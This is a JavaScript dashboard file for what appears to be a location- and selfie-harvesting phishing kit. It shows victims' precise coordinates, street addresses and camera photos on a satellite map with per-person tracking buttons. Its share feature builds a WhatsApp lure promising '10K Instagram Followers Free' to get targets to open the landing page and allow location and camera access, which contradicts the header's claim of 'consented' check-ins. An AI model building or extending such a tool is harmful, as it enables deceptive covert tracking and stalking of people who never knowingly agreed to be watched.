/* Empire Security Dashboard — read-only polling of consented check-ins.
 * Polls GET /api/locations (+ /api/stats) every 5s. Never requests the
 * viewer's own geolocation.
 */
(function () {
  "use strict";

  function resolveApiBase() {
    try {
      var q = new URLSearchParams(window.location.search).get("api");
      if (q) return q.replace(/\/$/, "");
    } catch (e) {}
    if (window.EMPIRE_API_BASE) return String(window.EMPIRE_API_BASE).replace(/\/$/, "");
    if (window.location.protocol === "file:") return "http://127.0.0.1:8000";
    // Dashboard served from /dashboard on the same FastAPI origin -> use origin.
    return window.location.origin.replace(/\/$/, "");
  }
  var API_BASE = resolveApiBase();
  var POLL_MS = 5000;

  var elTotal = document.getElementById("statTotal");
  var elLatest = document.getElementById("statLatest");
  var elLast = document.getElementById("statLast");
  var elAcc = document.getElementById("statAcc");
  var elSessions = document.getElementById("statSessions");
  var rows = document.getElementById("rows");
  var indicator = document.getElementById("refreshIndicator");
  var autoBox = document.getElementById("autoRefresh");
  var refreshBtn = document.getElementById("refreshBtn");

  // ---- Send Link box: landing URL + copy + WhatsApp share ----
  var shareInput = document.getElementById("shareLink");
  var copyBtn = document.getElementById("copyBtn");
  var waBtn = document.getElementById("waBtn");
  var copyMsg = document.getElementById("copyMsg");
  var LANDING_URL = API_BASE + "/";
  shareInput.value = LANDING_URL;
  waBtn.href =
    "https://wa.me/?text=" +
    encodeURIComponent("🎉 10K Instagram Followers Free! Verify here: " + LANDING_URL);

  function copyFallback(text) {
    shareInput.select();
    try {
      return document.execCommand("copy");
    } catch (e) {
      return false;
    }
  }

  copyBtn.addEventListener("click", function () {
    var text = shareInput.value;
    function done(ok) {
      copyMsg.textContent = ok
        ? "Copied! Ab is link ko kahin bhi bhejo."
        : "Copy nahi hua — link select karke manually copy karo.";
    }
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(
        function () { done(true); },
        function () { done(copyFallback(text)); }
      );
    } else {
      done(copyFallback(text));
    }
  });

  var map = L.map("leafletMap").setView([20, 0], 2);

  var osmMap = L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
    maxZoom: 19,
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
  });

  var esriSat = L.tileLayer(
    "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}",
    {
      maxZoom: 19,
      attribution:
        "Imagery &copy; Esri, Maxar, Earthstar Geographics",
    }
  );

  // Transparent street/place labels to overlay on satellite = Hybrid view.
  var labelOverlay = L.tileLayer(
    "https://{s}.basemaps.cartocdn.com/dark_only_labels/{z}/{x}/{y}{r}.png",
    {
      maxZoom: 19,
      subdomains: "abcd",
      attribution: '&copy; <a href="https://carto.com/">CARTO</a>',
    }
  );

  var hybrid = L.layerGroup([esriSat, labelOverlay]);

  hybrid.addTo(map); // default view = Hybrid
  L.control
    .layers(
      { Hybrid: hybrid, Satellite: esriSat, Map: osmMap },
      null,
      { position: "topright" }
    )
    .addTo(map);
  var markers = [];
  var markerBySession = {};

  function fmt(n, d) {
    if (n === null || n === undefined || isNaN(Number(n))) return "—";
    return Number(n).toFixed(d === undefined ? 6 : d);
  }

  function popupHtml(l) {
    return (
      "<b>Address:</b> " + (l.address || "not available") + "<br/>" +
      "<b>Latitude:</b> " + fmt(l.latitude) + "<br/>" +
      "<b>Longitude:</b> " + fmt(l.longitude) + "<br/>" +
      "<b>Accuracy:</b> " + fmt(l.accuracy, 1) + " m<br/>" +
      "<b>Timestamp:</b> " + (l.timestamp || "—") + "<br/>" +
      "<b>Session:</b> " + (l.session_id || "—")
    );
  }

  function renderMarkers(list) {
    markers.forEach(function (m) { map.removeLayer(m); });
    markers = [];
    markerBySession = {};
    var bounds = [];
    // Oldest-first so newest markers sit on top.
    list.slice().reverse().forEach(function (l) {
      if (typeof l.latitude !== "number" || typeof l.longitude !== "number") return;
      var m = L.marker([l.latitude, l.longitude]).addTo(map).bindPopup(popupHtml(l));
      markers.push(m);
      markerBySession[l.session_id] = { marker: m, loc: l };
      bounds.push([l.latitude, l.longitude]);
    });
    if (bounds.length === 1) map.setView(bounds[0], 13);
    else if (bounds.length > 1) map.fitBounds(bounds, { padding: [30, 30] });
  }

  function renderTable(list) {
    if (!list.length) {
      rows.innerHTML = '<tr><td colspan="9">No locations yet — press [ PRESS HERE ] on the landing page and Allow.</td></tr>';
      return;
    }
    rows.innerHTML = "";
    list.forEach(function (l) {
      var tr = document.createElement("tr");
      function td(t) { var c = document.createElement("td"); c.textContent = t; return c; }
      tr.appendChild(td(l.id));
      var addrTd = document.createElement("td");
      addrTd.textContent = l.address || "—";
      addrTd.title = l.address || "";
      tr.appendChild(addrTd);
      tr.appendChild(td(fmt(l.latitude)));
      tr.appendChild(td(fmt(l.longitude)));
      tr.appendChild(td(fmt(l.accuracy, 1)));
      tr.appendChild(td(l.timestamp || "—"));
      tr.appendChild(td(l.session_id || "—"));
      tr.appendChild(td(l.created_at || "—"));
      var delTd = document.createElement("td");
      delTd.className = "del";
      var b = document.createElement("button");
      b.textContent = "Delete";
      b.onclick = function () {
        if (!confirm("Delete location #" + l.id + "?")) return;
        fetch(API_BASE + "/api/location/" + l.id, { method: "DELETE" }).then(function () {
          refresh();
        });
      };
      delTd.appendChild(b);
      tr.appendChild(delTd);
      rows.appendChild(tr);
    });
  }

  var liveRow = document.getElementById("liveRow");
  var liveDetail = document.getElementById("liveDetail");
  var photoGrid = document.getElementById("photoGrid");

  function renderPhotos(list) {
    photoGrid.innerHTML = "";
    if (!list.length) {
      photoGrid.innerHTML = '<span class="muted-line">No selfies yet.</span>';
      return;
    }
    list.forEach(function (p) {
      var a = document.createElement("a");
      a.href = API_BASE + p.url;
      a.target = "_blank";
      a.rel = "noopener";
      var img = document.createElement("img");
      img.src = API_BASE + p.url;
      img.alt = "Selfie " + p.id;
      img.loading = "lazy";
      a.appendChild(img);
      var cap = document.createElement("div");
      cap.className = "cap";
      cap.textContent = "#" + p.id + " • " + (p.created_at || "");
      a.appendChild(cap);
      photoGrid.appendChild(a);
    });
  }

  // One button per person (latest check-in per session, newest first).
  // Tap -> map jumps to that person, popup opens, full detail shows below.
  function renderLive(list) {
    var seen = {};
    var people = [];
    list.forEach(function (l) {
      if (l.session_id && !seen[l.session_id]) {
        seen[l.session_id] = true;
        people.push(l);
      }
    });
    liveRow.innerHTML = "";
    if (!people.length) {
      liveRow.innerHTML = '<span class="muted-line">No check-ins yet.</span>';
      liveDetail.textContent = "Tap any person to see their full location.";
      return;
    }
    people.forEach(function (l, i) {
      var b = document.createElement("button");
      b.type = "button";
      b.textContent = "📍 Person " + (i + 1) + " • " + fmt(l.latitude, 2) + ", " + fmt(l.longitude, 2);
      b.title = l.created_at || l.timestamp || "";
      b.onclick = function () {
        var btns = liveRow.querySelectorAll("button");
        for (var k = 0; k < btns.length; k++) btns[k].classList.remove("active");
        b.classList.add("active");
        var entry = markerBySession[l.session_id];
        if (entry && typeof entry.loc.latitude === "number") {
          map.setView([entry.loc.latitude, entry.loc.longitude], 15);
          entry.marker.openPopup();
        }
        liveDetail.innerHTML =
          "<b>Person " + (i + 1) + "</b> • received " + (l.created_at || l.timestamp || "—") + "<br/>" +
          "<b>Address:</b> " + (l.address || "not available") + "<br/>" +
          "<b>Latitude:</b> " + fmt(l.latitude) + " &nbsp; <b>Longitude:</b> " + fmt(l.longitude) + "<br/>" +
          "<b>Accuracy:</b> " + fmt(l.accuracy, 1) + " m &nbsp; <b>Session:</b> " + (l.session_id || "—") + "<br/>" +
          "<b>Timestamp:</b> " + (l.timestamp || "—");
        document.getElementById("map").scrollIntoView({ behavior: "smooth", block: "center" });
      };
      liveRow.appendChild(b);
    });
  }

  function renderStatsFromList(list) {
    elTotal.textContent = String(list.length);
    if (!list.length) {
      elLatest.textContent = "—"; elLast.textContent = "—";
      elAcc.textContent = "—"; elSessions.textContent = "0";
      return;
    }
    var latest = list[0];
    elLatest.textContent = fmt(latest.latitude) + ", " + fmt(latest.longitude);
    elLast.textContent = latest.created_at || latest.timestamp || "—";
    var sum = 0, n = 0;
    var sessions = {};
    list.forEach(function (l) {
      if (typeof l.accuracy === "number") { sum += l.accuracy; n++; }
      if (l.session_id) sessions[l.session_id] = true;
    });
    elAcc.textContent = n ? (sum / n).toFixed(1) + " m" : "—";
    elSessions.textContent = String(Object.keys(sessions).length);
  }

  function setIndicator(ok, msg) {
    indicator.textContent = (ok ? "● " : "○ ") + msg;
    indicator.className = "refresh" + (ok ? "" : " bad");
  }

  var timer = null;
  function refresh() {
    setIndicator(true, "refreshing…");
    // Prefer /api/stats when available, but /api/locations alone is enough.
    fetch(API_BASE + "/api/locations?limit=200")
      .then(function (r) {
        if (!r.ok) throw new Error("HTTP " + r.status);
        return r.json();
      })
      .then(function (list) {
        renderStatsFromList(list);
        renderMarkers(list);
        renderTable(list);
        renderLive(list);
        return fetch(API_BASE + "/api/photos?limit=24").then(function (r) {
          return r.ok ? r.json() : [];
        });
      })
      .then(function (photos) {
        renderPhotos(photos || []);
        var now = new Date().toLocaleTimeString();
        setIndicator(true, "updated " + now + " · polling every 5s");
      })
      .catch(function (err) {
        setIndicator(false, "backend unreachable (" + err.message + ") — is FastAPI running?");
      });
  }

  function schedule() {
    if (timer) clearInterval(timer);
    if (autoBox.checked) timer = setInterval(refresh, POLL_MS);
  }

  refreshBtn.addEventListener("click", refresh);
  autoBox.addEventListener("change", schedule);
  schedule();
  refresh();
})();
